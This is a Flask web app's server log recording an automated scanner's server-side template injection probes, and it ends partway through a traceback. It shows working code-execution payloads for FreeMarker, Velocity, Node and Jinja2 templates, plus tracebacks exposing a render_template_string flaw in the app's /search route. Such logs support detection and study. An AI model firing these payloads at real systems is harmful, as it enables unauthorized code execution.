[2024-08-20 10:03:08,174] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/myprofile > [FUNC] [/MyProfile] [Succeess] User:<usr-1>
[2024-08-21 07:59:36,848] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=zj{2870*7290}zj > [AUTH] [passrec] [Failed] User:<zj{2870*7290}zj> does not exist
[2024-08-21 07:59:36,851] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=zj{7438*3885}zj > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<zj{7438*3885}zj>
[2024-08-21 07:59:36,863] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<zj${2611*3629}zj> Password:<ZAP>
[2024-08-21 07:59:36,866] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=zj${7828*1920}zj > [AUTH] [passrec] [Failed] User:<zj${7828*1920}zj> does not exist
[2024-08-21 07:59:36,870] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=zj${2323*5327}zj > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<zj${2323*5327}zj>
[2024-08-21 07:59:36,882] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<zj#{1604*8584}zj> Password:<ZAP>
[2024-08-21 07:59:36,885] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=zj%23{7949*4330}zj > [AUTH] [passrec] [Failed] User:<zj#{7949*4330}zj> does not exist
[2024-08-21 07:59:36,888] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=zj%23{2001*4469}zj > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<zj#{2001*4469}zj>
[2024-08-21 07:59:36,899] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<zj{#7913*3519}zj> Password:<ZAP>
[2024-08-21 07:59:36,904] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=zj{%233774*8197}zj > [AUTH] [passrec] [Failed] User:<zj{#3774*8197}zj> does not exist
[2024-08-21 07:59:36,908] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=zj{%239070*3832}zj > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<zj{#9070*3832}zj>
[2024-08-21 07:59:36,910] [ERROR] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=zj{%239070*3832}zj > Exception on /search [GET]
Traceback (most recent call last):
  File "/usr/local/lib/python3.10/site-packages/flask/app.py", line 2190, in wsgi_app
    response = self.full_dispatch_request()
  File "/usr/local/lib/python3.10/site-packages/flask/app.py", line 1486, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/usr/local/lib/python3.10/site-packages/flask/app.py", line 1484, in full_dispatch_request
    rv = self.dispatch_request()
  File "/usr/local/lib/python3.10/site-packages/flask/app.py", line 1469, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
  File "/usr/local/lib/python3.10/site-packages/flask_login/utils.py", line 290, in decorated_view
    return current_app.ensure_sync(func)(*args, **kwargs)
  File "/app/tsapp/routes.py", line 405, in search
    return render_template("searchlist.html", tasks=tasks, tstatus=tstatus, tsearch=render_template_string(tsearch))
  File "/usr/local/lib/python3.10/site-packages/flask/templating.py", line 162, in render_template_string
    template = app.jinja_env.from_string(source)
  File "/usr/local/lib/python3.10/site-packages/jinja2/environment.py", line 1105, in from_string
    return cls.from_code(self, self.compile(source), gs, None)
  File "/usr/local/lib/python3.10/site-packages/jinja2/environment.py", line 768, in compile
    self.handle_exception(source=source_hint)
  File "/usr/local/lib/python3.10/site-packages/jinja2/environment.py", line 936, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "<unknown>", line 1, in template
jinja2.exceptions.TemplateSyntaxError: Missing end of comment tag
[2024-08-21 07:59:36,925] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<zj{@4598*1464}zj> Password:<ZAP>
[2024-08-21 07:59:36,925] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=zj{@1514*4044}zj > [AUTH] [passrec] [Failed] User:<zj{@1514*4044}zj> does not exist
[2024-08-21 07:59:36,940] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=zj{@5987*2922}zj > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<zj{@5987*2922}zj>
[2024-08-21 07:59:36,944] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<zj{{9752*5952}}zj> Password:<ZAP>
[2024-08-21 07:59:36,944] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=zj{{2494*8359}}zj > [AUTH] [passrec] [Failed] User:<zj{{2494*8359}}zj> does not exist
[2024-08-21 07:59:36,962] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=zj{{9693*7754}}zj > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<zj{{9693*7754}}zj>
[2024-08-21 07:59:36,966] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<zj{{=4602*1960}}zj> Password:<ZAP>
[2024-08-21 07:59:36,967] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=zj{{%3D2349*8294}}zj > [AUTH] [passrec] [Failed] User:<zj{{=2349*8294}}zj> does not exist
[2024-08-21 07:59:36,984] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<zj<%=3218*5630%>zj> Password:<ZAP>
[2024-08-21 07:59:36,989] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=zj<%25%3D8341*3206%25>zj > [AUTH] [passrec] [Failed] User:<zj<%=8341*3206%>zj> does not exist
[2024-08-21 07:59:37,001] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<zj#set($x=4357*7608)${x}zj> Password:<ZAP>
[2024-08-21 07:59:37,007] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=zj%23set($x%3D6025*5330)${x}zj > [AUTH] [passrec] [Failed] User:<zj#set($x=6025*5330)${x}zj> does not exist
[2024-08-21 07:59:37,020] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<zj<p th:text="${9700*2671}"></p>zj> Password:<ZAP>
[2024-08-21 07:59:37,028] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=zj<p+th:text%3D"${5346*2763}"></p>zj > [AUTH] [passrec] [Failed] User:<zj<p th:text="${5346*2763}"></p>zj> does not exist
[2024-08-21 07:59:37,055] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<zj{@math key="1160" method="multiply" operand="5541"/}zj> Password:<ZAP>
[2024-08-21 07:59:37,063] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=zj{@math+key%3D"5466"+method%3D"multiply"+operand%3D"2019"/}zj > [AUTH] [passrec] [Failed] User:<zj{@math key="5466" method="multiply" operand="2019"/}zj> does not exist
[2024-08-21 07:59:37,074] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<zj{{91540|add:40300}}zj> Password:<ZAP>
[2024-08-21 07:59:37,083] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=zj{{11160|add:19950}}zj > [AUTH] [passrec] [Failed] User:<zj{{11160|add:19950}}zj> does not exist
[2024-08-21 07:59:37,091] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<zj{{print "5259" "4200"}}zj> Password:<ZAP>
[2024-08-21 07:59:37,103] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=zj{{print+"3576"+"9432"}}zj > [AUTH] [passrec] [Failed] User:<zj{{print "3576" "9432"}}zj> does not exist
[2024-08-21 07:59:37,204] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<zj 4129*7542 zj>
[2024-08-21 07:59:37,491] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<zj 8628*5361 zj>
[2024-08-21 07:59:37,691] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<zj{4662*6830}zj>
[2024-08-21 07:59:38,588] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<zj${9739*5021}zj>
[2024-08-21 07:59:38,908] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<zj{9211*8009}zj>
[2024-08-21 07:59:39,044] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<zj#{6659*4302}zj>
[2024-08-21 07:59:39,342] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<zj${3904*2017}zj>
[2024-08-21 07:59:39,580] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<zj{#6465*2903}zj>
[2024-08-21 07:59:39,747] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<zj#{2101*7068}zj>
[2024-08-21 07:59:40,032] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<zj{@9064*6950}zj>
[2024-08-21 07:59:40,391] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<zj{#2206*6767}zj>
[2024-08-21 07:59:40,507] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<zj{{5695*5532}}zj>
[2024-08-21 07:59:40,817] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<zj{@4791*4913}zj>
[2024-08-21 07:59:41,016] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<zj{{=8624*2579}}zj>
[2024-08-21 07:59:41,292] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<zj{{8808*6339}}zj>
[2024-08-21 07:59:41,505] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<zj<%=5332*6870%>zj>
[2024-08-21 07:59:41,723] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<zj{{=5518*6698}}zj>
[2024-08-21 07:59:41,931] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<zj#set($x=5625*1139)${x}zj>
[2024-08-21 07:59:42,158] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<zj<%=3285*9376%>zj>
[2024-08-21 07:59:42,357] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<zj<p th:text="${9718*6438}"></p>zj>
[2024-08-21 07:59:42,650] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<zj#set($x=3063*3577)${x}zj>
[2024-08-21 07:59:42,750] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<zj{@math key="6992" method="multiply" operand="2731"/}zj>
[2024-08-21 07:59:43,061] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<zj<p th:text="${5747*8545}"></p>zj>
[2024-08-21 07:59:43,189] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<zj{{81100|add:58480}}zj>
[2024-08-21 07:59:43,467] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<zj{@math key="9265" method="multiply" operand="4182"/}zj>
[2024-08-21 07:59:43,603] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Succeess] User:<zj{{print "6027" "7901"}}zj>
[2024-08-21 07:59:43,621] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:43,641] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:43,663] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:43,692] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:43,712] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:43,731] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:43,805] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:43,823] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:43,843] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:43,864] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:43,880] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<zj{{91940|add:19170}}zj>
[2024-08-21 07:59:43,882] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:43,918] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:43,936] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:43,962] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:43,981] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:43,999] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:44,018] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:44,036] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:44,053] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:44,072] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:44,090] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:44,111] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:44,129] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:44,148] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:44,167] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:44,186] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:44,208] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:44,225] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/reg > [AUTH] [REG] [Failed] Please, enter other login or not null login or not null password
[2024-08-21 07:59:44,299] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<ZAP> Password:<zj{{print "8685" "2128"}}zj>
[2024-08-21 07:59:44,433] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("sleep 15") }> Password:<ZAP>
[2024-08-21 07:59:44,433] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=<%23assign+ex%3D"freemarker.template.utility.Execute"?new()>+${+ex("sleep+15")+} > [AUTH] [passrec] [Failed] User:<<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("sleep 15") }> does not exist
[2024-08-21 07:59:44,437] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=<%23assign+ex%3D"freemarker.template.utility.Execute"?new()>+${+ex("sleep+15")+} > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("sleep 15") }>
[2024-08-21 07:59:44,485] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<#set($engine="")
#set($proc=$engine.getClass().forName("java.lang.Runtime").getRuntime().exec("sleep 15"))
#set($null=$proc.waitFor())
${null}> Password:<ZAP>
[2024-08-21 07:59:44,486] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=%23set($engine%3D"")%0A%23set($proc%3D$engine.getClass().forName("java.lang.Runtime").getRuntime().exec("sleep+15"))%0A%23set($null%3D$proc.waitFor())%0A${null} > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<#set($engine="")
#set($proc=$engine.getClass().forName("java.lang.Runtime").getRuntime().exec("sleep 15"))
#set($null=$proc.waitFor())
${null}>
[2024-08-21 07:59:44,487] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=%23set($engine%3D"")%0A%23set($proc%3D$engine.getClass().forName("java.lang.Runtime").getRuntime().exec("sleep+15"))%0A%23set($null%3D$proc.waitFor())%0A${null} > [AUTH] [passrec] [Failed] User:<#set($engine="")
#set($proc=$engine.getClass().forName("java.lang.Runtime").getRuntime().exec("sleep 15"))
#set($null=$proc.waitFor())
${null}> does not exist
[2024-08-21 07:59:44,503] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<{{= global.process.mainModule.require('child_process').execSync('sleep 15').toString() }}> Password:<ZAP>
[2024-08-21 07:59:44,504] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search={{%3D+global.process.mainModule.require('child_process').execSync('sleep+15').toString()+}} > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<{{= global.process.mainModule.require('child_process').execSync('sleep 15').toString() }}>
[2024-08-21 07:59:44,506] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login={{%3D+global.process.mainModule.require('child_process').execSync('sleep+15').toString()+}} > [AUTH] [passrec] [Failed] User:<{{= global.process.mainModule.require('child_process').execSync('sleep 15').toString() }}> does not exist
[2024-08-21 07:59:44,505] [ERROR] from 10.61.0.10 req: http://10.61.1.10:7000/search?search={{%3D+global.process.mainModule.require('child_process').execSync('sleep+15').toString()+}} > Exception on /search [GET]
Traceback (most recent call last):
  File "/usr/local/lib/python3.10/site-packages/flask/app.py", line 2190, in wsgi_app
    response = self.full_dispatch_request()
  File "/usr/local/lib/python3.10/site-packages/flask/app.py", line 1486, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/usr/local/lib/python3.10/site-packages/flask/app.py", line 1484, in full_dispatch_request
    rv = self.dispatch_request()
  File "/usr/local/lib/python3.10/site-packages/flask/app.py", line 1469, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
  File "/usr/local/lib/python3.10/site-packages/flask_login/utils.py", line 290, in decorated_view
    return current_app.ensure_sync(func)(*args, **kwargs)
  File "/app/tsapp/routes.py", line 405, in search
    return render_template("searchlist.html", tasks=tasks, tstatus=tstatus, tsearch=render_template_string(tsearch))
  File "/usr/local/lib/python3.10/site-packages/flask/templating.py", line 162, in render_template_string
    template = app.jinja_env.from_string(source)
  File "/usr/local/lib/python3.10/site-packages/jinja2/environment.py", line 1105, in from_string
    return cls.from_code(self, self.compile(source), gs, None)
  File "/usr/local/lib/python3.10/site-packages/jinja2/environment.py", line 768, in compile
    self.handle_exception(source=source_hint)
  File "/usr/local/lib/python3.10/site-packages/jinja2/environment.py", line 936, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "<unknown>", line 1, in template
jinja2.exceptions.TemplateSyntaxError: unexpected '='
[2024-08-21 07:59:44,523] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<<%= global.process.mainModule.require('child_process').execSync('sleep 15').toString()%>> Password:<ZAP>
[2024-08-21 07:59:44,524] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=<%25%3D+global.process.mainModule.require('child_process').execSync('sleep+15').toString()%25> > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<<%= global.process.mainModule.require('child_process').execSync('sleep 15').toString()%>>
[2024-08-21 07:59:44,525] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=<%25%3D+global.process.mainModule.require('child_process').execSync('sleep+15').toString()%25> > [AUTH] [passrec] [Failed] User:<<%= global.process.mainModule.require('child_process').execSync('sleep 15').toString()%>> does not exist
[2024-08-21 07:59:44,541] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<#{global.process.mainModule.require('child_process').execSync('sleep 15').toString()}> Password:<ZAP>
[2024-08-21 07:59:44,542] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search=%23{global.process.mainModule.require('child_process').execSync('sleep+15').toString()} > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<#{global.process.mainModule.require('child_process').execSync('sleep 15').toString()}>
[2024-08-21 07:59:44,544] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login=%23{global.process.mainModule.require('child_process').execSync('sleep+15').toString()} > [AUTH] [passrec] [Failed] User:<#{global.process.mainModule.require('child_process').execSync('sleep 15').toString()}> does not exist
[2024-08-21 07:59:44,565] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<{{range.constructor("return eval(\"global.process.mainModule.require('child_process').execSync('sleep 15').toString()\")")()}}> Password:<ZAP>
[2024-08-21 07:59:44,567] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search={{range.constructor("return+eval(\"global.process.mainModule.require('child_process').execSync('sleep+15').toString()\")")()}} > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<{{range.constructor("return eval(\"global.process.mainModule.require('child_process').execSync('sleep 15').toString()\")")()}}>
[2024-08-21 07:59:44,568] [ERROR] from 10.61.0.10 req: http://10.61.1.10:7000/search?search={{range.constructor("return+eval(\"global.process.mainModule.require('child_process').execSync('sleep+15').toString()\")")()}} > Exception on /search [GET]
Traceback (most recent call last):
  File "/usr/local/lib/python3.10/site-packages/flask/app.py", line 2190, in wsgi_app
    response = self.full_dispatch_request()
  File "/usr/local/lib/python3.10/site-packages/flask/app.py", line 1486, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/usr/local/lib/python3.10/site-packages/flask/app.py", line 1484, in full_dispatch_request
    rv = self.dispatch_request()
  File "/usr/local/lib/python3.10/site-packages/flask/app.py", line 1469, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
  File "/usr/local/lib/python3.10/site-packages/flask_login/utils.py", line 290, in decorated_view
    return current_app.ensure_sync(func)(*args, **kwargs)
  File "/app/tsapp/routes.py", line 405, in search
    return render_template("searchlist.html", tasks=tasks, tstatus=tstatus, tsearch=render_template_string(tsearch))
  File "/usr/local/lib/python3.10/site-packages/flask/templating.py", line 163, in render_template_string
    return _render(app, template, context)
  File "/usr/local/lib/python3.10/site-packages/flask/templating.py", line 132, in _render
    rv = template.render(context)
  File "/usr/local/lib/python3.10/site-packages/jinja2/environment.py", line 1301, in render
    self.environment.handle_exception()
  File "/usr/local/lib/python3.10/site-packages/jinja2/environment.py", line 936, in handle_exception
    raise rewrite_traceback_stack(source=source)
  File "<template>", line 1, in top-level template code
  File "/usr/local/lib/python3.10/site-packages/jinja2/utils.py", line 83, in from_obj
    if hasattr(obj, "jinja_pass_arg"):
jinja2.exceptions.UndefinedError: 'type object' has no attribute 'constructor'
[2024-08-21 07:59:44,574] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/passrec?login={{range.constructor("return+eval(\"global.process.mainModule.require('child_process').execSync('sleep+15').toString()\")")()}} > [AUTH] [passrec] [Failed] User:<{{range.constructor("return eval(\"global.process.mainModule.require('child_process').execSync('sleep 15').toString()\")")()}}> does not exist
[2024-08-21 07:59:44,586] [WARNING] from 10.61.0.10 req: http://10.61.1.10:7000/login > [AUTH] [LOGIN] [Failed] User:<{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("sleep 15")}}> Password:<ZAP>
[2024-08-21 07:59:44,588] [INFO] from 10.61.0.10 req: http://10.61.1.10:7000/search?search={{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("sleep+15")}} > [FUNC] [/search] [Succeess] User:<ZAP> Role:<0> Data:<{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("sleep 15")}}>
[2024-08-21 07:59:44,592] [ERROR] from 10.61.0.10 req: http://10.61.1.10:7000/search?search={{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("sleep+15")}} > Exception on /search [GET]
Traceback (most recent call last):
  File "/usr/local/lib/python3.10/site-packages/flask/app.py", line 2190, in wsgi_app
    response = self.full_dispatch_request()
  File "/usr/local/lib/python3.10/site-packages/flask/app.py", line 1486, in full_dispatch_request
    rv = self.handle_user_exception(e)
